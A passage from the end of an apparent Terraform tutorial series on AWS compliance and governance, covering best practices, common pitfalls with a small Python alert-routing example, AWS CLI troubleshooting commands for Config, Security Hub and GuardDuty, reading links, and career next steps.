- **Version control all policies** in Git with proper review processes
- **Test policies in non-production** environments before deployment
- **Use meaningful policy names** and comprehensive documentation
- **Implement graduated enforcement** (warn first, then enforce)
- **Regular policy review** and updates based on changing requirements

### 2. Security Controls
- **Layer security controls** with defense-in-depth approach
- **Enable comprehensive logging** for all security-relevant events
- **Implement automated response** to high-severity security findings
- **Regular security assessments** and penetration testing
- **Keep security tools updated** with latest threat intelligence

### 3. Compliance Automation
- **Automate compliance checking** rather than manual audits
- **Implement continuous compliance** monitoring and alerting
- **Document compliance procedures** and evidence collection
- **Regular compliance reporting** to stakeholders and auditors
- **Remediation automation** where possible and safe

### 4. Audit and Documentation
- **Maintain comprehensive audit trails** for all infrastructure changes
- **Document all compliance decisions** and exceptions
- **Regular access reviews** and privilege auditing
- **Evidence preservation** for regulatory compliance
- **Change management integration** with approval workflows

### 5. Governance Framework
- **Establish clear governance policies** and enforcement mechanisms
- **Define roles and responsibilities** for compliance management
- **Regular training** on compliance requirements and procedures
- **Exception handling process** for justified non-compliance
- **Continuous improvement** based on audit findings and incidents

## ⚠️ Common Pitfalls

### 1. Over-Restrictive Policies
**Problem:** Policies that block legitimate business activities
**Solution:**
- Start with monitoring and warnings before enforcement
- Involve business stakeholders in policy design
- Implement exception handling processes
- Regular policy review and adjustment based on feedback

### 2. Alert Fatigue from Compliance Violations
**Problem:** Too many low-priority compliance alerts causing important ones to be ignored
**Solution:**
```python
# Intelligent alerting with severity-based routing
class ComplianceAlertManager:
    def __init__(self):
        self.alert_thresholds = {
            'CRITICAL': {'immediate': True, 'escalation': 'pager'},
            'HIGH': {'immediate': True, 'escalation': 'slack'},
            'MEDIUM': {'batch': True, 'frequency': 'daily'},
            'LOW': {'batch': True, 'frequency': 'weekly'}
        }
    
    def process_compliance_violation(self, violation):
        severity = self.calculate_severity(violation)
        threshold = self.alert_thresholds.get(severity, {})
        
        if threshold.get('immediate'):
            self.send_immediate_alert(violation, threshold['escalation'])
        elif threshold.get('batch'):
            self.add_to_batch(violation, threshold['frequency'])
```

### 3. Inconsistent Policy Enforcement
**Problem:** Policies applied inconsistently across environments or accounts
**Solution:**
- Use infrastructure as code for policy deployment
- Centralized policy management with AWS Organizations
- Regular compliance scanning across all environments
- Automated policy deployment and updates

### 4. Insufficient Evidence Collection
**Problem:** Unable to provide audit evidence during compliance reviews
**Solution:**
- Implement comprehensive logging and monitoring
- Automated evidence collection and preservation
- Regular backup of audit logs and compliance data
- Document all compliance-related decisions and changes

### 5. Poor Change Management
**Problem:** Compliance violations introduced through uncontrolled changes
**Solution:**
- Integrate compliance checks into CI/CD pipelines
- Require compliance review for all infrastructure changes
- Implement automated rollback for non-compliant changes
- Regular training on change management procedures

## 🔍 Troubleshooting

### AWS Config Rules Not Evaluating

**Problem:** Config rules showing no evaluations or outdated results

**Diagnosis:**
```bash
# Check Config recorder status
aws configservice describe-configuration-recorders

# Check delivery channel status
aws configservice describe-delivery-channels

# Verify Config rule status
aws configservice describe-config-rules --config-rule-names <rule-name>

# Check for Config rule evaluation results
aws configservice get-compliance-details-by-config-rule \
  --config-rule-name <rule-name>
```

**Solutions:**
1. Ensure Config recorder is enabled and recording
2. Verify IAM permissions for Config service
3. Check if resources are in scope for Config recording
4. Validate Config rule parameters and syntax

### Security Hub Findings Not Appearing

**Problem:** Expected security findings not showing in Security Hub

**Diagnosis:**
```bash
# Check Security Hub status
aws securityhub describe-hub

# List enabled standards
aws securityhub get-enabled-standards

# Check GuardDuty detector status
aws guardduty list-detectors
aws guardduty get-detector --detector-id <detector-id>

# Verify EventBridge rules
aws events list-rules --name-prefix <project-name>
```

**Solutions:**
1. Ensure Security Hub is enabled in all required regions
2. Verify security services (GuardDuty, Inspector) are enabled
3. Check EventBridge rules are properly configured
4. Validate IAM permissions for security services

### Compliance Remediation Failures

**Problem:** Automatic remediation not working for non-compliant resources

**Diagnosis:**
```bash
# Check remediation configuration status
aws configservice describe-remediation-configurations \
  --config-rule-names <rule-name>

# Check remediation execution history
aws configservice describe-remediation-execution-status \
  --config-rule-name <rule-name>

# Verify Systems Manager document exists
aws ssm describe-document --name <document-name>
```

**Solutions:**
1. Verify remediation IAM role has required permissions
2. Check SSM document parameters are correct
3. Ensure target resources support the remediation action
4. Review CloudWatch logs for remediation Lambda functions

## 📚 Further Reading

### Official Documentation
- [AWS Config Documentation](https://docs.aws.amazon.com/config/)
- [AWS Security Hub User Guide](https://docs.aws.amazon.com/securityhub/)
- [AWS GuardDuty Documentation](https://docs.aws.amazon.com/guardduty/)
- [Open Policy Agent Documentation](https://www.openpolicyagent.org/docs/)

### Compliance Frameworks
- [SOC 2 Compliance on AWS](https://aws.amazon.com/compliance/soc/)
- [PCI DSS on AWS](https://aws.amazon.com/compliance/pci-dss-level-1-faqs/)
- [HIPAA Compliance on AWS](https://aws.amazon.com/compliance/hipaa-compliance/)
- [GDPR Compliance on AWS](https://aws.amazon.com/compliance/gdpr-center/)

### Policy as Code
- [HashiCorp Sentinel](https://www.hashicorp.com/sentinel/)
- [Open Policy Agent Terraform](https://www.openpolicyagent.org/docs/latest/terraform/)
- [AWS Config Rule Development](https://docs.aws.amazon.com/config/latest/developerguide/evaluate-config.html)

### Security Best Practices
- [AWS Well-Architected Security Pillar](https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Cloud Security Alliance](https://cloudsecurityalliance.org/)

### Community Resources
- [AWS Samples - Config Rules](https://github.com/awslabs/aws-config-rules)
- [Terraform Compliance](https://terraform-compliance.com/)
- [Checkov by Bridgecrew](https://www.checkov.io/)

## 🎯 Next Steps

Congratulations! You've completed the Terraform Fundamentals series and mastered compliance and governance frameworks. You now understand how to:

- Implement comprehensive policy as code with AWS Config and OPA
- Build automated compliance scanning and remediation systems
- Deploy security controls for threat detection and response
- Create audit trails and evidence collection systems
- Apply software engineering quality patterns to infrastructure governance
- Address regulatory compliance requirements (SOC 2, PCI DSS, HIPAA, GDPR)
- Design and implement zero-trust security architectures

### Skills Gained Throughout This Series
✅ **Infrastructure as Code Mastery**: Complete Terraform development lifecycle  
✅ **State Management**: Remote state, workspaces, team collaboration  
✅ **Project Architecture**: Modular design, reusable components, enterprise patterns  
✅ **Security Implementation**: Encryption, access controls, security scanning  
✅ **Cost Optimization**: Resource optimization, budget controls, cost monitoring  
✅ **Environment Management**: Multi-environment strategies, promotion pipelines  
✅ **Scalability Design**: Auto-scaling, load balancing, distributed systems  
✅ **Observability Engineering**: Monitoring, logging, alerting, performance optimization  
✅ **Disaster Recovery**: Multi-region DR, backup strategies, business continuity  
✅ **Compliance & Governance**: Policy as code, regulatory compliance, audit frameworks  

### Career Impact
Completing this comprehensive Terraform Fundamentals series positions you for senior infrastructure and platform engineering roles:

- **Senior DevOps Engineer**: Leading infrastructure automation and governance initiatives
- **Cloud Architect**: Designing enterprise-scale, compliant cloud architectures  
- **Platform Engineer**: Building developer platforms with integrated governance and security
- **Site Reliability Engineer**: Ensuring system reliability, security, and compliance
- **Principal Engineer**: Setting organizational standards for infrastructure and governance
- **Infrastructure Manager**: Leading teams and defining infrastructure strategy
- **Compliance Engineer**: Implementing regulatory compliance in cloud environments

### Recommended Next Steps

1. **Practice with Real Projects**: Apply these patterns to actual business requirements
2. **Contribute to Open Source**: Share your infrastructure modules and policies with the community
3. **Pursue Certifications**: AWS Solutions Architect, HashiCorp Terraform Associate/Professional
4. **Learn Adjacent Technologies**: Kubernetes, service mesh, CI/CD platforms
5. **Develop Leadership Skills**: Mentoring, technical architecture, team leadership

You now have the foundation to build, secure, and govern enterprise-scale infrastructure using modern engineering practices. The combination of technical depth and governance understanding makes you valuable for any organization building reliable, compliant cloud infrastructure.